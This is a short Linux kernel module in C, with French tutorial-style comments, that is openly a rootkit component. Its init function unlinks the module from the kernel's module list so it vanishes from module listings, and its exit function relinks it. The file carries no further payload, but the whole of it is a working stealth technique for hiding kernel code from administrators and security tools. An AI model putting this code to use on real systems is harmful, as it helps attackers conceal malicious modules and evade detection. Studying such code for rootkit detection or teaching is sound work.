#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// licence du module (GPL = General Public License) en gros opensource
// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
MODULE_LICENSE("GPL");
MODULE_AUTHOR("victor");
// pour avoir la description quand on fait modinfo 
MODULE_DESCRIPTION("Hide LKM");
MODULE_VERSION("0.01");


// list_head -> double liste chainé utilisé par le kernel
// ca prends un .prev et .next mais on peut utiliser list_del() et list_add() pour ajouter/enlever des items de la struct list_head
// on doit juste garder une copie locale de l'item qu'on enlève au debut pour pouvoir le rajouter a la fin quand on a fini
static struct list_head *prev_module;
// 0 = visible, 1 = hidden
static short hidden = 0;

void showme(void)
{
    // on ajoute le module dans la liste des modules
    list_add(&THIS_MODULE->list, prev_module);
    //on set hidden a 0 pour dire que le module est visible
    hidden = 0;
}

void hideme(void)
{
    // on garde une copie du pointeur vers le module précédent (pour pouvoir le retrouver et le remettre a la bonne position quand on voudra le rajouter dans la liste)
    prev_module = THIS_MODULE->list.prev;
    // on supp le module de la liste des modules
    list_del(&THIS_MODULE->list);
    // on set hidden a 1 pour dire que le module est caché
    hidden = 1; 
}

// fonction éxécuté quand on charge le module dans le noyau
// __init ->  utilisé qu'à l'initialisation et que le code sera libéré après cette phase pour économiser de la mémoire
static int __init rootkit_init(void)
{
    hideme();
    return 0;
}

// fonction éxécuté quand on décharge le module du noyau
static void __exit rootkit_exit(void)
{
    showme();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
